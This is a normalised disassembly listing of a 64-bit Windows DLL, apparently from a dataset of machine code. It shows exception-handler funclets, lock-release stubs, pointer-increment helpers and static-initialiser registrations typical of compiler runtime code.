add rsp 0x20
pop rbp
retn
sub_180036605
lea rcx [ rdx + 0x58 ]
jmp sub_18001fa20
sub_180036611
mov rcx [ rdx + 0x40 ]
jmp sub_18000b6e0
sub_180036621
mov rcx [ rdx + 0x40 ]
add rcx 0x28
jmp sub_18000bda0
sub_180036631
lea rcx [ rdx + 0x48 ]
jmp sub_18001fa20
sub_18003663d
lea rcx [ rdx + 0x40 ]
jmp sub_18001fa20
sub_18003668f
push rbp
sub rsp 0x20
mov rbp rdx
call sub_1800265b4
nop
add rsp 0x20
pop rbp
retn
sub_1800366a5
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x40 ] 0x0
jne r-xdata
add rsp 0x20
pop rbp
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
call sub_180025b2c
nop
sub_1800366cb
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
mov rdx rcx
mov ecx [ rax ]
call sub_1800288c8
nop
add rsp 0x20
pop rbp
retn
sub_1800366e9
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_18002cfa8
nop
add rsp 0x20
pop rbp
retn
sub_180036709
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_18002cfa8
nop
add rsp 0x20
pop rbp
retn
sub_180036729
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rbp + 0x60 ]
and [ rax + 0xc8 ] 0xffffffef
add rsp 0x20
pop rbp
retn
sub_180036744
push rbp
sub rsp 0x20
mov rbp rdx
call sub_180023f94
nop
add rsp 0x20
pop rbp
retn
sub_180036764
push rbp
sub rsp 0x20
mov rbp rdx
call sub_180025c90
cmp [ rax + 0x100 ] 0x0
jle r-xdata
add rsp 0x20
pop rbp
retn
call sub_180025c90
dec [ rax + 0x100 ]
sub_18003678d
push rbp
sub rsp 0x20
mov rbp rdx
xor eax eax
cmp [ rbp + 0x38 ] al
setne al
add rsp 0x20
pop rbp
retn
sub_180036934
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xe
call sub_18002cfa8
nop
add rsp 0x20
pop rbp
retn
sub_18003694f
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_18002cfa8
nop
add rsp 0x20
pop rbp
retn
sub_18003696f
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_18002cfa8
nop
add rsp 0x20
pop rbp
retn
sub_18003698a
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x80 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
mov ecx 0x8
call sub_18002cfa8
nop
sub_1800369ae
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xc
call sub_18002cfa8
nop
add rsp 0x20
pop rbp
retn
sub_1800369c9
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xd
call sub_18002cfa8
nop
add rsp 0x20
pop rbp
retn
sub_1800369e4
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
nop
add rsp 0x20
pop rbp
retn
sub_180036a02
push rbp
sub rsp 0x20
mov rbp rdx
cmp [ rbp + 0x60 ] 0x0
je r-xdata
add rsp 0x20
pop rbp
retn
xor ecx ecx
call sub_18002cfa8
nop
sub_180036a20
push rbp
sub rsp 0x20
mov rbp rdx
mov rax [ rcx ]
xor ecx ecx
cmp [ rax ] 0xc0000005
sete cl
mov eax ecx
mov eax ecx
add rsp 0x20
pop rbp
retn
sub_180036a42
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx [ rbp + 0x50 ]
call sub_180031004
nop
add rsp 0x20
pop rbp
retn
sub_180036a5b
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0xa
call sub_18002cfa8
nop
add rsp 0x20
pop rbp
retn
sub_180036a76
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_18002cfa8
nop
add rsp 0x20
pop rbp
retn
sub_180036a91
push rbp
sub rsp 0x20
mov rbp rdx
movsxd rcx [ rbp + 0x20 ]
mov rax rcx
mov rdx [ rw-data ]
mov rdx [ rdx + rcx * 8 ]
call sub_18002f280
nop
add rsp 0x20
pop rbp
retn
sub_180036ac1
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx 0x1
call sub_18002cfa8
nop
add rsp 0x20
pop rbp
retn
sub_180036adc
push rbp
sub rsp 0x20
mov rbp rdx
mov rcx [ rbp + 0x30 ]
call sub_18002f234
nop
add rsp 0x20
pop rbp
retn
sub_180036af6
push rbp
sub rsp 0x20
mov rbp rdx
mov ecx [ rbp + 0x40 ]
call sub_180031004
nop
add rsp 0x20
pop rbp
retn
sub_180036b10
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180036b30
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036b50
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036b70
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180036b80
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180036ba0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036bc0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036be0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180036bf0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036c10
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036c30
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036c50
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180036c70
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036c90
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036cb0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180036cc0
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180036ce0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036d00
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036d20
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180036d30
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036d50
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036d70
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036d90
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180036db0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036dd0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036df0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180036e00
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180036e20
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036e40
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036e60
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180036e70
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180036e90
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036eb0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036ed0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180036ee0
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180036f00
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036f20
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036f40
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180036f50
sub rsp 0x28
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov r8d 0x1
call sub_180008110
lea rcx [ sub_180037520 ]
add rsp 0x28
jmp sub_180021c0c
sub_180036f80
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180036fa0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036fc0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180036fe0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180036ff0
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180037010
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037030
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037050
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180037060
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180037080
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_1800370a0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_1800370c0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_1800370d0
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_1800370f0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037110
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037130
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180037140
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180037160
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037180
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_1800371a0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_1800371b0
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_1800371d0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_1800371f0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037210
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180037220
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_180037240
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037260
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037280
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180037290
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_1800372b0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_1800372d0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_1800372f0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180037300
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037320
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037340
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037360
sub rsp 0x28
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov r8d 0x1
call sub_180008110
lea rcx [ sub_180037560 ]
add rsp 0x28
jmp sub_180021c0c
sub_180037390
mov rax [ rw-data ]
add rax 0x4
mov [ rw-data ] rax
retn
sub_1800373b0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_1800373d0
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_1800373f0
mov rax [ rw-data ]
mov [ rw-data ] rax
retn
sub_180037400
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037420
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037440
mov rcx [ rw-data ]
add rcx [ rw-data ]
mov [ rw-data ] rcx
retn
sub_180037460
sub rsp 0x28
lea rdx [ r--data ]
lea rcx [ rw-data ]
mov r8d 0x1
call sub_180008110
lea rcx [ sub_1800375a0 ]
add rsp 0x28
jmp sub_180021c0c
sub_180037490
sub rsp 0x28
lea rcx [ rw-data ]
call sub_18001f968
lea rcx [ sub_1800375dc ]
add rsp 0x28
jmp sub_180021c0c
sub_1800374b0
lea rcx [ sub_1800375f4 ]
jmp sub_180021c0c
sub_1800374bc
lea rcx [ sub_1800375e8 ]
jmp sub_180021c0c
sub_1800374c8
lea rcx [ sub_180037648 ]
jmp sub_180021c0c
sub_1800374d4
lea rcx [ sub_180037658 ]
jmp sub_180021c0c
sub_1800374e0
lea rcx [ sub_180037668 ]
jmp sub_180021c0c
sub_1800374ec
sub rsp 0x28
lea rcx [ rw-data ]
call sub_18001f968
lea rcx [ sub_180037678 ]
add rsp 0x28
jmp sub_180021c0c
sub_18003750c
lea rcx [ sub_180037684 ]
jmp sub_180021c0c
sub_180037520
sub rsp 0x28
cmp [ rw-data ] 0x10
jb r-xdata
mov [ rw-data ] 0xf
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
add rsp 0x28
retn
mov rcx [ rw-data ]
call j_sub_18002094c#2
sub_180037560
sub rsp 0x28
cmp [ rw-data ] 0x10
jb r-xdata
mov [ rw-data ] 0xf
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
add rsp 0x28
retn
mov rcx [ rw-data ]
call j_sub_18002094c#2
sub_1800375a0
sub rsp 0x28
cmp [ rw-data ] 0x10
jb r-xdata
mov [ rw-data ] 0xf
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
add rsp 0x28
retn
mov rcx [ rw-data ]
call j_sub_18002094c#2
sub_1800375dc
lea rcx [ rw-data ]
jmp sub_18001f9b4
sub_1800375e8
lea rcx [ rw-data ]
jmp sub_18000b6f0
sub_180037648
lea rax [ r--data ]
mov [ rw-data ] rax
retn
sub_180037658
lea rax [ r--data ]
mov [ rw-data ] rax
retn
sub_180037668
lea rax [ r--data ]
mov [ rw-data ] rax
retn
sub_180037678
lea rcx [ rw-data ]
jmp sub_18001f9b4
sub_1800376c0
lea rax [ r--data ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
jmp sub_180020498
